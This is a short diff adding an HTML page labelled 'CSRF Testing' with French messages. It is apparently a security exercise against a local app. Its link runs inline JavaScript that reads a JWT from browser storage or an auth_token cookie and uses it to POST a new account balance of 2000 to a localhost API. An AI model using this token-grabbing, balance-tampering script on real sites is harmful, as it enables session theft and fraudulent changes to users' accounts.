@@ -1,0 +1,37 @@
+<div class="container">
+    <h1>CSRF Testing</h1>
+    <p>Click the button below to execute the CSRF test script.</p>
+    <a href="javascript:(function(){
+      function getCookie(name) {
+          const value = `; ${document.cookie}`;
+          const parts = value.split(`; ${name}=`);
+          if (parts.length === 2) return parts.pop().split(';').shift();
+          return null;
+      }
+  
+      const jwt = localStorage.getItem('token') || sessionStorage.getItem('token') || getCookie('auth_token');
+      if (!jwt) {
+          alert('JWT introuvable !');
+          return;
+      }
+  
+      fetch('http://localhost:5000/api/home/balance', {
+          method: 'POST',
+          headers: {
+              'Authorization': `Bearer ${jwt}`,
+              'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ 'newBalance': 2000 })
+      })
+      .then(response => {
+          if (!response.ok) {
+              throw new Error(`Erreur HTTP ${response.status}: ${response.statusText}`);
+          }
+          return response.json();
+      })
+      .then(data => alert('Requête réussie : ' + JSON.stringify(data)))
+      .catch(err => alert('Erreur : ' + err.message));
+    })();">
+      Cliquez ici pour exécuter le script
+    </a>
+  </div>
